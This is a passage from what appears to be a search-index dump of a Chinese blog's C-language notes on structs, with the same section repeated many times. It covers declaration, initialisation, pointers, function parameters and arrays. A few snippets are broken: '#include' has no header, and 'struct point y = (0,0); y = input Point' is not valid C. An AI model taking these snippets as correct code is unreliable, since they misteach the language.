p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#第一种形式"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#第二种形式"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#第三种形式"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构的初始化"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构成员"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构运算"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构指针"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构作为函数参数"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#输入结构解决方案"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#c指向结构的指针"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 只是举个栗子，完整的代码就不qiao了 结构中的结构 struct dateAndTime{ struct time stime; struct date sdate; }; 嵌套的结构\r结构中的结构的数组\r","date":"2023-11-17","objectID":"/c_language_notes/:11:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#结构数组"},{"categories":["Programing"],"content":"\r11.2结构\r声明结构类型 #include int main(int argc,char const *argv[]) { struct date{ int month; int day; int year; }; //该分号易漏，一定要注意 struct date today; today.month = 07; today.day = 31; today.year = 2014; printf(\"Today's date is %i-%i-%i.\\n\",today.year,today.month,today.day); return 0; } 当然，和本地变量一样，在函数内部声明的结构类型只能在结构内部使用 所以通常在函数外部声明结构类型，这样就可以被多个函数使用了 声明结构的形式\r第一种形式 struct point{ int x; int y; }; struct point p1,p2; p1和p2都是point里面有x和y的值 先声明结构，再给出变量 第二种形式 struct { int x; int y; }p1,p2; p1和p2都是一种无名结构，里面有x和y 第三种形式 struct point { int x; int y; }p1,p2; p1和p2都是point，里面有x和y 结构的初始化 #include struct date { int month; int day; int year; }; int main() { struct date today = {07, 31, 2014}; struct date thismonth = { .month = 7,.year = 2014 }; printf(\"Today's date is %i-%i-%i.\\n\", today.year, today.month, today.day); printf(\"Today's date is %i-%i-%i.\\n\", thismonth.year, thismonth.month, thismonth.day); } 上面给出了两种初始化类型 结构成员结构和数组有点像 数组用[]运算符和下标访问其成员 ​ a[0]=10； 结构用.运算符和名字访问其成员 结构运算要访问整个结构，直接用结构变量的名字 对于整个结构，可以做赋值、取地址、也可以传递给函数参数 p1 = (struct point){5,10}; //相当于p1.x = 5;p1.y = 10; 结构指针和数组不同，结构变量的名字并不是结构变量的地址，必须使用\u0026运算符 struct date *pDate = \u0026today; 结构作为函数参数 int numberofDays(struct date d) 整个结构可以作为参数的值传入函数 这时候是在函数内部新建一个结构变量，并赋值调用者的结构的值 也可以返回一个结构，这与数组完全不同 “输入结构”解决方案把一个结构传入函数，然后再函数中操作，但是没有返回回去 问题在于传入函数的是外面那个结构的克隆体，而不是指针 ​ 传入结构和传入数组是不同的 ​ 在这个输入函数中，完全可以创建一个临时的结构变量，然后把这个结构返回给调用者 void main(){ struct point y = (0,0); y = input Point } struct point inputPoint() { struct point temp; scanf(\"%d\",\u0026temp.x); scanf(\"%d\",\u0026temp.y); return temp; } c指向结构的指针 struct date { int month; int day; int year; }myday; struct date *p = \u0026myday; (*p).month = 12; p-\u003emonth = 12; 用-\u003e表示指针所指的结构变量中的成员 结构数组 struct date dates[100]; struct date dates[] = { {4,5,2005},{2,4,2005}}; 